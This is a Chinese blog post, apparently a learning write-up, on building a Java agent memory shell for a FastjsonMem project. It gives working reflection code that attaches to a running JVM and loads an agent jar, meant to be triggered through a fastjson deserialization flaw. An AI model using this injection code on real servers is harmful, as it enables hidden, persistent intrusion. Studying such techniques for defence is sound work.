# Agent 内存马

用的FastjsonMem做的项目
[nice_0e3](https://www.cnblogs.com/nice0e3/p/14086165.html)先跟这位师傅学习一下。

在实战中只有启动后加载agent才会有实质性的作用。
在文章中分析,实际只要三步就可完成agent内存马！
![image-20220913164945711](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209131649815.png)

那其实这里构造agent内存马的思路很简单。

- 找到加载的已知类
- 反射调用其方法
- 由于 tools.jar 并不会在 JVM 启动的时候默认加载，利用 URLClassloader 来加载我们的 tools.jar

于是有以下代码。

```java
package xs;

public class Demo {

    public static void main(String[] args) {
        try{
            java.io.File toolsPath = new java.io.File(System.getProperty("java.home").replace("jre","lib") + java.io.File.separator + "tools.jar");
            System.out.println(toolsPath.toURI().toURL());
            java.net.URL url = toolsPath.toURI().toURL();
            java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{url});
            Class<?> MyVirtualMachine = classLoader.loadClass("com.sun.tools.attach.VirtualMachine");
            Class<?> MyVirtualMachineDescriptor = classLoader.loadClass("com.sun.tools.attach.VirtualMachineDescriptor");
            java.lang.reflect.Method listMethod = MyVirtualMachine.getDeclaredMethod("list",null);
            java.util.List<Object> list = (java.util.List<Object>) listMethod.invoke(MyVirtualMachine,null);

            System.out.println("Running JVM Start..");
            for(int i=0;i<list.size();i++){
                Object o = list.get(i);
                java.lang.reflect.Method displayName = MyVirtualMachineDescriptor.getDeclaredMethod("displayName",null);
                String name = (String) displayName.invoke(o,null);
                System.out.println(name);
                if (name.contains("xs.Demo")){
                    java.lang.reflect.Method getId = MyVirtualMachineDescriptor.getDeclaredMethod("id",null);
                    java.lang.String id = (java.lang.String) getId.invoke(o,null);
                    System.out.println("id >>> " + id);
                    java.lang.reflect.Method attach = MyVirtualMachine.getDeclaredMethod("attach",new Class[]{java.lang.String.class});
                    java.lang.Object vm = attach.invoke(o,id);
                    java.lang.reflect.Method loadAgent = MyVirtualMachine.getDeclaredMethod("loadAgent",new Class[]{java.lang.String.class});
                    java.lang.String path = "F:\\AgentMem\\target\\AgentMem-1.0-SNAPSHOT.jar";
                    loadAgent.invoke(vm,path);
                    java.lang.reflect.Method detach = MyVirtualMachine.getDeclaredMethod("detach",null);
                    detach.invoke(vm,null);
                    break;
                }
            }
        } catch (Exception e){
            e.printStackTrace();
        }
    }
}
```

这里有些值得注意的点，我将原来的代码中`loadAgent.invoke(vm,new Object[]{path});`和`java.lang.Object vm = attach.invoke(o,new Object[]{id});`都该成了普通字符串，因为看方法参数传入的是字符串。
然后只要想办法将`Demo`构造一下，然后让其加载一下就行（也就是找一个触发点，这里用的fastjson！！）

最后在说个奇怪的东西。
![image-20220913171912396](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209131719573.png)

不知道为什么python启动的环境一直没有收到该收到的请求。但是还是成功弹了计算器~
